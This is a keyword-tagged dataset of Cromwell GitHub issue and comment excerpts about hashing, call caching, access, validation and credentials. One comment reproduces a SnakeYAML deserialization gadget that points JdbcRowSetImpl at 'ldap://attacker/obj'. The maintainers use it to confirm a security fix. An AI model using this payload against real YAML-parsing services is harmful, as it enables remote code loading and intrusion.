Security,Tasks cannot call cache if their names are different (unless the tasks have no inputs!). The following tasks cannot call cache:. ```; task foo {; Int i; command { echo ${i} }; }; ```. ```; task bar {; Int i; command { echo ${i} }; }; ```. The call caching simpletons shouldn't include the call name in the input hash keys:. ```; +----------------------------+-----------------------------------------+----------------------------------+-----------------------+; | CALL_CACHING_HASH_ENTRY_ID | HASH_KEY | HASH_VALUE | CALL_CACHING_ENTRY_ID |; +----------------------------+-----------------------------------------+----------------------------------+-----------------------+; ....; | 137 | input: File foo.i | 778138a97b315ec95f374425255f8b9e | 12 |; | 138 | input: File bar.i | 778138a97b315ec95f374425255f8b9e | 13 |; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1989:312,hash,hash,312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1989,1,['hash'],['hash']
Security,Tasks with large files (>100GB) in input take a lot of time to start even if nothing (or almost nothing) happens in the command. I believe something should be optimized there because having a cache does not make sense when computing inputs hashes (or whatever slows thing down) is comparable or even slower to taking results out of cache,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213:240,hash,hashes,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213,1,['hash'],['hashes']
Security,Temporary patch: Use an encrypted variable for the vault token.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4583:24,encrypt,encrypted,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4583,1,['encrypt'],['encrypted']
Security,"Terra/Cromwell workflows using data that has been exported from the UChicago Gen3/Windmill system or the HCA Data Browser with DRS URI data references frequently (always?) fail in the Ammonite script that performs the DRS resolution/localization. Failed workflows using DRS URI data references most often have error messages and logs as shown below. These examples are from the Terra workspace `firecloud-cgl/20190701 Test` in which a small number of files were exported from Windmill to Terra, and an md5sum workflow was exported from Dockstore. These same error messages and log entries have been seen in many other similar workspaces over the last couple/few months (no data before that). @abaumann has been recently and actively involved in the investigation of this problem, and has access to this workspace. ```; Task ga4ghMd5.md5:NA:1 failed. The job was stopped before the command finished. PAPI error code 10. The assigned worker has failed to complete the operation	. 2019/07/01 22:54:02 Starting container setup.; 2019/07/01 22:54:11 Done container setup.; 2019/07/01 22:54:17 Starting localization.; 2019/07/01 22:54:24 Localizing input dos://dg.4503/1406db81-91d7-4e57-ada3-40487199ed06 -> /cromwell_root/topmed-irc-share/genomes/NWD522711.b38.irc.v1.cram; Compiling (synthetic)/ammonite/predef/interpBridge.sc; ```. or. ```; Task ga4ghMd5.md5:NA:1 failed. The job was stopped before the command finished. PAPI error code 10. The assigned worker has failed to complete the operation	. 2019/07/10 19:25:06 Starting container setup.; 2019/07/10 19:25:14 Done container setup.; 2019/07/10 19:25:20 Starting localization.; 2019/07/10 19:25:26 Localizing input dos://dg.4503/1cba8116-a3d1-41e6-aab3-428e4f42e916 -> /cromwell_root/topmed-irc-share/genomes/NWD735861.b38.irc.v1.cram.crai; Compiling (synthetic)/ammonite/predef/interpBridge.sc; Compiling (synthetic)/ammonite/predef/DefaultPredef.sc; ```. In some cases, additional information is logged, as in the following example where Ammonit",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5069:788,access,access,788,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5069,1,['access'],['access']
Security,Test script for DRS access [BT-539],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6667:20,access,access,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6667,1,['access'],['access']
Security,Tested the newer fingerprint hashing strategy (using a hash of equal size). Happy to report about 1000 cache hits (100%) correctly on our cluster when I needed to restart a workflow.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-610339380:29,hash,hashing,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-610339380,2,['hash'],"['hash', 'hashing']"
Security,Tests being fixed with hash bumps I can get behind. 👍 . [![Approved with PullApprove](https://img.shields.io/badge/two_reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/3627/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389224539:23,hash,hash,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389224539,1,['hash'],['hash']
Security,Tests validation of placeholder attributes and adds handling of the `true=` and `false=` attributes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3572:6,validat,validation,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3572,1,['validat'],['validation']
Security,"Thank @mcovarr and @cjllanwarne, I believe I am done. Please let me know if there is anything else. I am not authorized to merge this PR, so I am leaving this up to your team.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-341513736:109,authoriz,authorized,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-341513736,1,['authoriz'],['authorized']
Security,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:103,password,password,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981,2,"['hash', 'password']","['hashes', 'password']"
Security,"Thanks @aednichols, looks like I didn't scroll down enough - I think @cjllanwarne added this test at the very start so wasn't on my horizon to check. I've pushed a fix, and will confirm when it's fixed. Edit: Initial logs look like it's passing. Edit 2: Looks like `womtool/src/test/resources/validate/biscayne/valid/*` must have a workflow to validate - fixed and running tests again. ```; [info] - should be able to output a graph for biscayne workflow: 'sep_function' *** FAILED *** (59 milliseconds); [info] In WDL not in Graph: Set(); In Graph not in WDL: Set(SepTestInInterpolatorBlock) Set() was not equal to Set(""SepTestInInterpolatorBlock"") (WomtoolValidateSpec.scala:84); [info] org.scalatest.exceptions.TestFailedException:; [info] ...; [info] at womtool.WomtoolValidateSpec.$anonfun$new$14(WomtoolValidateSpec.scala:84); [info] at org.scalatest.Assertions.withClue(Assertions.scala:1221); [info] at org.scalatest.Assertions.withClue$(Assertions.scala:1208); [info] at org.scalatest.FlatSpec.withClue(FlatSpec.scala:1685); [info] at womtool.WomtoolValidateSpec.$anonfun$new$12(WomtoolValidateSpec.scala:84); [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); [info] ...; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-656436553:293,validat,validate,293,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-656436553,2,['validat'],['validate']
Security,"Thanks @antonkulaga - this is weird, it looks like the validator is incorrectly confusing the workflow output `out` and the `task get_sample` output `out`. I'm not 100% sure why, but until we fix this if you rename the `get_sample` temporary `out` variable it seems to work, eg:; ```; Array[Array[String]] out2 = read_tsv(""output.tsv""); File reads_1 = out2[0][0]; File reads_2 = out2[0][1]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3176#issuecomment-359898327:55,validat,validator,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3176#issuecomment-359898327,1,['validat'],['validator']
Security,"Thanks @illusional, I've come to a very similar configuration, albeit for singularity 3.X. I ended up settling on this:. ```; submit-docker = """"""; export SINGULARITY_CACHEDIR=/data/cephfs/punim0751/singularity_cache; module load Singularity/3.0.3-spartan_gcc-6.2.0; IMAGE=/data/cephfs/punim0751/${docker}; singularity build --sandbox $IMAGE docker://${docker} > /dev/null; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of runni",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:828,access,access,828,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['access'],['access']
Security,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:203,expose,exposed,203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194,7,"['access', 'attack', 'expose']","['access', 'attacker', 'exposed']"
Security,"Thanks @patmagee, @geoffjentry and all for directing me to the correct place, I've created a discussion over at https://github.com/openwdl/wdl/issues/289 as a place to have the conversation. If anyone finds this conversation, I'd love to see any thoughts you have on how accessory files may be specified in WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464532451:271,access,accessory,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464532451,1,['access'],['accessory']
Security,"Thanks Saman!. Quick Question: What is “parent workflow ID” here?. I thought that QUERY should only be returning top level workflow result? Otherwise you’re going to get lots of workflow entries in QUERY for the same SUBMIT request which seems odd to me. Maybe it’d be useful to make getting subworkflows opt in/out? But that’s me thinking out loud and not for this PR!. Since we *do* expose subworkflows, we probably should give the “top level” ID (the one returned by SUBMIT) rather than direct “parent” ID.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2971#issuecomment-348701623:385,expose,expose,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2971#issuecomment-348701623,1,['expose'],['expose']
Security,Thanks again for looking into the null hash issue. I unfortunately don't have a small reproducible case but have a larger case that seems to always hit this problem if the traceback isn't enough information to debug. It's the `somatic-giab-mix` CWL validation set from here:. https://github.com/bcbio/bcbio_validation_workflows#somatic-genome-in-a-bottle-mixture. and the first errors start to occur ~2hr into the run. Sorry this isn't a minimal case but hope it's useful when you have an opportunity to look into it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-387799021:39,hash,hash,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-387799021,2,"['hash', 'validat']","['hash', 'validation']"
Security,Thanks for fixing this!. Would you be willing to also add a test case for draft-2 and/or 1.0 to https://github.com/broadinstitute/cromwell/tree/develop/womtool/src/test/resources/validate to make sure this doesn't regress again?. You shouldn't need to do any wiring other than dropping a new test case into an appropriate `valid/testname` directory.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401169672:179,validat,validate,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401169672,1,['validat'],['validate']
Security,Thanks for letting us know about this. We discovered a critical bug in Cromwell 28 yesterday and released a patched version of the jar. I believe @geoffjentry prepared an updated version of the Homebrew formula yesterday as well. The formula from June 30 is certainly referencing the older jar and will not match the current checksum.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316009656:325,checksum,checksum,325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316009656,1,['checksum'],['checksum']
Security,"Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->; `s3.caching.duplication-strategy` doesn't work on AWSBatch backend. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->; https://broadworkbench.atlassian.net/browse/CROM-6734. <!-- Which backend are you running? -->; AWSBatch. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. ```; include required(classpath(""application"")). backend {; default = ""aws""; providers {; aws {; config {; default-runtime-attributes {; scriptBucketName = ""caper4-04-20-2021""; queueArn = ""arn:aws:batch:us-east-1:618537831167:job-queue/default-caper5""; }; filesystems {; s3 {; caching {; duplication-strategy = ""reference""; }; auth = ""default""; }; }; concurrent-job-limit = 1000; numSubmitAttempts = 6; numCreateDefinitionAttempts = 6; auth = ""default""; root = ""s3://caper4-04-20-2021/out""; }; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; }; }; }. system {; job-rate-control {; jobs = 1; per = ""2 seconds""; }; abort-jobs-on-terminate = true; graceful-server-shutdown = true; max-concurrent-workflows = 40; }; call-caching {; invalidate-bad-cache-results = true; enabled = true; }; database {; db {; connectionTimeout = 30000; numThreads = 1; url = ""jdbc:hsqldb:file:/opt/caper/default_file_db;shutdown=fal",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6327:1241,PASSWORD,PASSWORDS,1241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6327,1,['PASSWORD'],['PASSWORDS']
Security,"Thanks for the brain dump. Chatting w/ some of our devops folks, they will work with us to move to CircleCI at some point. For now the team doesn't have the expertise nor bandwidth to evaluate how to do so securely. For example, we have several Hashicorp Vault rendered-secrets in our CI builds that should stay in the CI and not get vacuumed up into a docker image. I still want to ensure your code lives on, so for now [I submitted a PR](https://github.com/broadinstitute/cromwell/pull/4038) that takes takes your work above, wraps the `docker build` in a portable script, then adds it as [a parallel regression test](https://travis-ci.org/broadinstitute/cromwell/builds/420635707) under our common CI scripts. Whenever we move over from Travis to Circle it should move with the other scripts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416272052:206,secur,securely,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416272052,2,"['Hash', 'secur']","['Hashicorp', 'securely']"
Security,Thanks for the quick replies. You're saying this happens for only a few shards in the same scatter ? If that's the case it would suggest this is some sort of transient failure of gsutil to authenticate properly but I'm not sure why that would result in this error message,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435949112:189,authenticat,authenticate,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435949112,1,['authenticat'],['authenticate']
Security,Thanks for the response @danbills - this is on a compute node which only has access to the outside network through an http(s)/ftp proxy so it can't do name resolution for outside addresses. Why does cromwell try to resolve that particular address? We don't have docker available and I tried with a config file that only defines a local and slurm backend and still get the same exceptions.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626#issuecomment-462393738:77,access,access,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626#issuecomment-462393738,1,['access'],['access']
Security,Thanks for the review!. > Actually @kshakir pointed out that the test coverage on this patch is reported as 0% which given what it looks like the test is trying to do is kind of surprising... running `sbt coverageOn sfsBackend/test coverageAggregate coverageReport`; On this commit does generate a coverageReport. It shows that the extra code is being tested. So the codecov results are incorrect. (This PR is 75% test code for a reason!). Maybe it has something to do with me being an external contributor? I do not get access to travis secret variables. So if these are needed to report the coverage it will show up as 0%.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505298313:521,access,access,521,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505298313,1,['access'],['access']
Security,"Thanks for your help, this is great info. I see a part of our hashing code that is likely causing an issue here, will report back with more early next week.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457394714:62,hash,hashing,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457394714,1,['hash'],['hashing']
Security,"Thanks for your reply. I set the sql_mode ```SET GLOBAL sql_mode = 'ANSI_QUOTES';``` , than a new error occur. But when I change ``` driver = ""slick.driver.MySQLDriver$"" ``` to ```profile = ""slick.jdbc.MySQLProfile$""``` in cromwell.conf, all going well. ```; database {; # driver = ""slick.driver.MySQLDriver$""; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true&useSSL=false""; user = ""user""; password = ""123456""; connectionTimeout = 5000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438664522:488,password,password,488,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438664522,1,['password'],['password']
Security,"Thanks much for the helping with debugging on this. . Beyond the hash failure from Cromwell the other errors I get are all from the workflow itself due to not preserving the original file names. The numerical hashes for files get passed directly into the downstream tools, stripping off any extensions or other identifying information. This results in tool confusion, like tabix can't tell a file wasn't already gzipped:; ```; ValueError: Unexpected tabix input: /home/chapmanb/drive/work/cwl/test_bcbio_cwl/gcp/cromwell_work/cromwell-executions/main-somatic.cwl/93ef2d1c-88ee-4dc2-af0a-e0ea86bc785e/call-prep_samples/shard-0/execution/bedprep/cleaned-8539016497173364825.gz; ```; or bwa can't find all the other associated indices:; ```; bwa mem /home/chapmanb/drive/work/cwl/test_bcbio_cwl/gcp/cromwell_work/cromwell-executions/main-somatic.cwl/93ef2d1c-88ee-4dc2-af0a-e0ea86bc785e/call-alignment/shard-1/wf-alignment.cwl/96d7b606-e0fe-4305-a586-e0fc4acf76f8/call-process_alignment/shard-0/inputs/1628767813 [...]. [E::bwa_idx_load_from_disk] fail to locate the index files; ```; Is it expected to lose the original input file names when passing through the pipeline. A lot of tools are sensitive to these and this might be the underlying issue. Regarding the configuration, without `http {}` in under `engine -> filesystems` I get a complaint about it not being supported, even with `http {}` under `backend -> providers -> Local -> config -> filesystems`:; ```; java.lang.IllegalArgumentException: Either https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa exists on a filesystem not supported by this instance of Cromwell, or a failure occurred while building an actionable path from it. Supported filesystems are: LinuxFileSystem. Failures: LinuxFileSystem: Cannot build a local path from https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa (RuntimeException) Please refer to the documentation for more information on h",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320:65,hash,hash,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320,2,['hash'],"['hash', 'hashes']"
Security,"Thanks so much for the pointer to the hashing and details about adjusting that. You're exactly right that was what was happening. I saw the hash error and saw no new jobs launched, thought it had failed, so must have stopped the tasks before they finished the md5 summing and continued. I ran our analysis both with md5 checksumming and path based hashing, and it does save some time. The md5 based one took 6:43 and path based was 5:55. Doing based on paths works great for us so I'll swap to that as the default in bcbio pipelines. For database storage, are their known deficiencies with file based HSQL over MySQL? Do I have ways to mitigate those through different settings? We're planning to use MySQL in some circumstances but for providing something generally for users the file-based database will be the default and I'd like to make that as good and error free as possible. Is leaving this open for the `null` hash issue worthwhile? I also got some other hash errors on a different run that didn't affect completion but might be influencing re-use and storage that I could raise an issue on, but might be due to file based storage. If there are general things I can tweak and test I can do that first prior to opening additional issues. Thank you again for the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386666743:38,hash,hashing,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386666743,6,"['checksum', 'hash']","['checksumming', 'hash', 'hashing']"
Security,"Thanks! I think that the `""Report this Bug""` is *probably* a typo as long as the static validation in `womtool validate` *does* fail for this workflow. I this workflow started, ran a few jobs and **then** this happened, we should fix that ASAP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402838047:88,validat,validation,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402838047,2,['validat'],"['validate', 'validation']"
Security,Thanks! Sorry I was looking at it incorrectly. The GCP Batch backend adds the trailing slash. The Genomics API backend added a trailing slash as well. Google must have change the validation of the format. We will push a change that fixes it. In the interim if setting the network via the literal option instead of the label should fix it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299807501:179,validat,validation,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299807501,1,['validat'],['validation']
Security,Thanks. Do you know what email address they updated? I still cannot access the project containing that issue.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-509710309:68,access,access,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-509710309,1,['access'],['access']
Security,"That makes sense, and I understand the concerns around call caching discussed in the linked issue. If this ENV injection will never be supported is there another recommended method for a workflow to pass information about itself outside cromwell as this seems to be something many people have requested (dating back at least 6 years based on that issue). Right now, as far as I'm aware, the only option is to poll the REST API which is suboptimal if you're running many workflows at once, and also means that the external service must be authed to either Terra or wherever your standalone cromwell server lives. It would be very useful for those of us that already have systems for tracking metadata, sample information, etc if cromwell had the ability to notify those systems when results were available somehow. Either through a step in the workflow itself as requested above, or perhaps via webhooks or similar. If not the injection solution above, is anything like that on the roadmap, or is this just not something the team is planning on addressing? Everyone has limited resources and I get that certain things just aren't a priority.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855:111,inject,injection,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855,2,['inject'],['injection']
Security,"That was actually my first thought. But with this:; ```; version 1.0. workflow main {; call main {; input:; x = 1; }; }. task main {; input {; Int x; }. command <<<; echo ~{if (x == 1) then 1 else 0}; >>>; }; ```; when I parse it:; ```; $ java -jar womtool-52.jar validate main.wdl ; ERROR: Unexpected symbol (line 16, col 16) when parsing '_gen23'. Expected rparen, got """". echo ~{if (x == 1) then 1 else 0}; ^. $e = :lparen $_gen23 :rparen -> TupleLiteral( values=$1 ); ```; I was under the impression that Cromwell automatically adds parentheses but I am not really sure how it actually works.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-667242825:264,validat,validate,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-667242825,1,['validat'],['validate']
Security,"That's definitely a key aspect of the ask here, yea! We'd also love for some validation of the docker containers (and anything else that you can think to move into validate).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386025133:77,validat,validation,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386025133,2,['validat'],"['validate', 'validation']"
Security,"That's what I was thinking, yes. But that's a bit tricky because bash scripts don't really ""return"" anything. Perhaps each unique image (based on the hash) could be assigned its own directory within Cromwell, and that directory is set as the working directory for both `pull-docker` and `submit-docker`. Then, you can build the image into the CWD in `pull-docker`, and run it in `submit-docker` by just globbing for a `.sif` file (or whatever format it is)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4673#issuecomment-465849356:150,hash,hash,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4673#issuecomment-465849356,1,['hash'],['hash']
Security,"The ""resume"" part in @kcibul explanation made me think that we could actually separate the ""resume"" case from the ""I use call caching to simulate resume"" case, although it's probably not the solution for this and I'm not even sure it's a good idea at all.; We could imagine a resume endpoint that takes a workflowId and a WDL, and same way call caching works now, re-uses succeeded task outputs (except this time no need to copy them because we're still running the same workflow technically) from this workflow previous run as long as their hash matches the one of the new WDL, and when they don't or/and the job was failed, run it again. It'd be very similar to ""call caching without copying files"" in the end, just conceptually a bit different as it would be the same workflow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065516:542,hash,hash,542,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065516,2,['hash'],['hash']
